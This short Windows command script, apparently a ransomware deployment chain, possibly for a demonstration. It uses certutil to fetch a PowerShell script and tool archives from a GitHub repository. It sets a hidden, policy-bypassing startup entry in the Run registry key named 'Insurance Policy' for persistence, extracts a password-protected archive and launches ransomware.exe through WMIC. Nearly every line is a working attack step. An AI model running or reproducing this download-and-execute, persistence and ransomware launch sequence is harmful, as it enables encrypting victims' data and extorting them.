cd C:\temp
#. download powershell from github to c:\temp
certutil -urlcache -split -f "https://raw.githubusercontent.com/tmmdemo/automate/master/work.ps1" "work.ps1"

#. add to startup
#powershell.exe -executionPolicy Bypass C:\temp\work1.ps1
#powershell.exe -executionPolicy Bypass -windowStyle Hidden C:\temp\work1.ps1
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Insurance Policy" /t REG_SZ /F /D "powershell.exe -executionPolicy Bypass -windowStyle Hidden C:\temp\work.ps1"

#. download tools.zip from github
certutil -urlcache -split -f "https://raw.githubusercontent.com/tmmdemo/automate/master/tools-pro.zip" "tools-pro.zip"

#. extract tools-pro.zip
powershell.exe -nologo -noprofile -command "& { Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('tools-pro.zip', '.'); }"

#. 7z extract r.zip
.\7z x r.zip * -pinfected -y

#. run ransomware
WMIC process call create "C:\temp\ransomware.exe"
#WMIC process call create "C:\temp\notr.exe"
